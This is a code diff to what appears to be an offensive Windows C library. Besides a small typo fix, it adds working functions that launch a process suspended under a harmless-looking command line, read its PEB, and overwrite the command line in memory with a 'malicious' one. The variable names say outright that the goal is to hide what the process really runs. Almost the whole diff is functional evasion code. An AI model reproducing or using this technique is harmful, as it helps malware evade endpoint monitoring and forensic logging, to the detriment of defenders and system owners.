@@ -345,7 +345,7 @@ LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
 	return pFiles_arr_t;
 }
 
-BOOLEAN FetchLocalAllertableThread
+BOOLEAN FetchLocalAlertableThread
 (
 	IN     DWORD   dwMainThreadId,
 	   OUT PDWORD  pdwAlertedThreadId,
@@ -794,5 +794,150 @@ BOOLEAN SpoofParentProcessId
 	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
 	*pdwMaliciousThreadId = ProcessInformation_t.dwThreadId;
 	*phMaliciousThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwMaliciousThreadId);
+	return TRUE;
+}
+
+
+
+
+
+BOOLEAN SpoofParentProcessId2
+(
+	IN     LPWSTR  pSpoofedCommandLine,
+	IN	   LPWSTR  pMaliciousCommandLine,
+	   OUT PHANDLE phProcessHandle,
+	   OUT PDWORD  pdwProcessId,
+	   OUT PDWORD  pdwThreadId 
+)
+{
+	ULONG uRetren = 0;
+	NTSTATUS ntStatus = 0;
+
+	PROCESS_INFORMATION ProcessInformation_t = { 0 };
+	PROCESS_BASIC_INFORMATION ProcessBasicInfoBlock_t = { 0 };
+
+	fnNTQueryProcessInformation NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
+	STARTUPINFOW StartupInfo_t = { 0 };
+
+	WCHAR pPath[MAX_PATH] = {L'\0'};
+	SIZE_T sBytesRead = 0;
+
+	PPEB pProcEnvBlock_t = NULL;
+	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters = NULL;
+
+	StartupInfo_t.cb = sizeof(STARTUPINFOW);
+
+	wcscpy_s(pPath, MAX_PATH, pSpoofedCommandLine);
+
+	if (!CreateProcessW(
+		NULL,
+		pPath,
+		NULL,
+		NULL,
+		FALSE,
+		DETACHED_PROCESS | CREATE_SUSPENDED | CREATE_NO_WINDOW,      // creating the process suspended & with no window
+		NULL,
+		L"C:\\Windows\\System32\\",             // we can use GetEnvironmentVariableW to get this Programmatically
+		&StartupInfo_t,
+		&ProcessInformation_t)) {
+		printf("\t[!] CreateProcessW Failed with Error : %lu \n", GetLastError());
+		return FALSE;
+	}
+
+	if ((
+		ntStatus = NtQueryProcInfo(
+				ProcessInformation_t.hProcess, 
+				ProcessBasicInformation, 
+				&ProcessBasicInfoBlock_t, 
+				sizeof(PROCESS_BASIC_INFORMATION), 
+				&uRetren
+		)) != 0) {
+
+		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%lx \n", ntStatus);
+		return FALSE;
+	}
+
+	pProcEnvBlock_t = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
+
+	if (!ReadFromTargetProcess(
+		ProcessInformation_t.hProcess, 
+		ProcessBasicInfoBlock_t.PebBaseAddress, 
+		&pProcEnvBlock_t, 
+		sizeof(PEB)
+	)) return FALSE;
+
+
+
+	if (!ReadFromTargetProcess(
+		ProcessInformation_t.hProcess,
+		pProcEnvBlock_t->ProcessParameters, 
+		&pProcessUserParameters, 
+		sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)
+		) 
+	{
+		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
+		return FALSE;
+	}
+
+	if (!WriteToTargetProcess(ProcessInformation_t.hProcess,
+		(PVOID)pProcessUserParameters->CommandLine.Buffer, 
+		(PVOID)pMaliciousCommandLine, 
+		(DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1))
+		) {
+		printf("\t[!] Failed To Write The Real Parameters\n");
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOLEAN ReadFromTargetProcess
+(
+	IN     HANDLE hTargetProcess, 
+	IN     PVOID  pPEBBaseAddress, 
+	   OUT PVOID *pReadBufferAddress, 
+	IN     DWORD  dwBufferSize
+)
+{
+	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;
+
+	HANDLE hHeap = GetProcessHeap();
+
+	if (*pReadBufferAddress)
+	{
+		HeapFree(hHeap, NULL, *pReadBufferAddress);
+		*pReadBufferAddress = NULL;
+	}
+
+	SIZE_T	sBytesRead = 0;
+
+	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
+
+	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) {
+		printf("[!] ReadProcessMemory Failed With Error : %lx \n", GetLastError());
+		printf("[i] Bytes Read : %zu Of %lu \n", sBytesRead, dwBufferSize);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOLEAN WriteToTargetProcess
+(
+	IN      HANDLE hProcess,
+	IN      PVOID pAddressToWriteTo,
+	IN      PVOID pBuffer,
+	IN      DWORD dwBufferSize
+)
+{
+
+	SIZE_T sBytesWritten = 0;
+
+	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sBytesWritten) || sBytesWritten != dwBufferSize) {
+		printf("[!] WriteProcessMemory Failed With Error : %lx \n", GetLastError());
+		printf("[i] Bytes Written : %zu Of %lu \n", sBytesWritten, dwBufferSize);
+		return FALSE;
+	}
+
 	return TRUE;
 }
